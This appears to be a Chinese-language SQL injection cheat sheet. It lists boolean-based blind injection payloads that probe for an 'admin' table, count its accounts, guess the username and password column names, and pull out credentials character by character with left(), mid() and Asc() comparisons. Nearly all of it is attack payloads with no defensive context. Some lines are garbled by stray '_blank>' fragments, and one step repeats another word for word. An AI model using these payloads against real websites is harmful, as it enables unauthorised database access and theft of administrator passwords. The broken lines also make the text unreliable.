; and 1=1 and 1=2 
and 0<>(select count(*) from *)
and 0<>(select count(*) from admin) -- 判断是否存在admin这张表
-- 1.猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个
and 0<(select count(*) from admin)
and 1<(select count(*) from admin)
-- 2.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.
and 1=(select count(*) from admin where len(*)>0)--
and 1=(select count(*) from admin where len(用户字段名称name)>0) 
and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)
-- 3.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.
and 1=(select count(*) from admin where len(*)>0)--
and 1=(select count(*) from admin where len(用户字段名称name)>0) 
and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0) 
-- 4.猜解字符
and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位
and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位
-- 就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了
and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.